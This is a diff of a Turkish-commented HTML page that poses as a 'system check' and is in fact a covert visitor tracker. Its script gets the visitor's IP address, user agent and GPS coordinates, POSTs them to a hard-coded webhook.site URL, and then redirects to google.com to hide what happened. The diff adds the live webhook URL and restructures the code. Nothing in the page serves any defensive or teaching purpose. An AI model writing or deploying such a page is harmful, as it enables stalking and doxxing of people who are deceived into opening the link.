@@ -1,50 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Yükleniyor...</title>
+    <title>Sistem Kontrol Ediliyor...</title>
 </head>
 <body>
     <script>
-        const webhookURL = "SENIN_WEBHOOK_URLN_BURAYA";
+        // BURAYA KENDİ WEBHOOK LİNKİNİ YAPIŞTIR
+        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-        // Önce IP'yi alalım
-        fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-            let dataToSend = {
-                ip: ipData.ip,
-                cihaz: navigator.userAgent,
-                konum: "İzin Verilmedi"
-            };
-
-            // Şimdi GPS konumu isteyelim
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    // Kullanıcı izin verirse burası çalışır
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    dataToSend.konum = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    gonder(dataToSend);
-                }, () => {
-                    // İzin verilmezse sadece IP ile gönder
-                    gonder(dataToSend);
-                });
-            } else {
-                gonder(dataToSend);
-            }
-        });
-
-        function gonder(data) {
+        function verileriGonder(ip, konumVerisi = "İzin Verilmedi") {
             fetch(webhookURL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    ip_adresi: ip,
+                    cihaz: navigator.userAgent,
+                    harita_konumu: konumVerisi,
+                    zaman: new Date().toLocaleString()
+                })
             }).then(() => {
-                // Her durumda Google'a yönlendir
+                // Bilgi gidince Google'a yolla
                 window.location.href = "https://www.google.com";
             });
         }
+
+        // Önce IP'yi al
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                const userIP = ipData.ip;
+
+                // Konum izni iste
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            // İzin verildi, koordinatları al
+                            const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                            verileriGonder(userIP, link);
+                        },
+                        () => {
+                            // İzin reddedildi
+                            verileriGonder(userIP, "Kullanıcı Konum İznini Reddetti");
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    verileriGonder(userIP, "Tarayıcı GPS Desteklemiyor");
+                }
+            });
     </script>
 </body>
 </html>
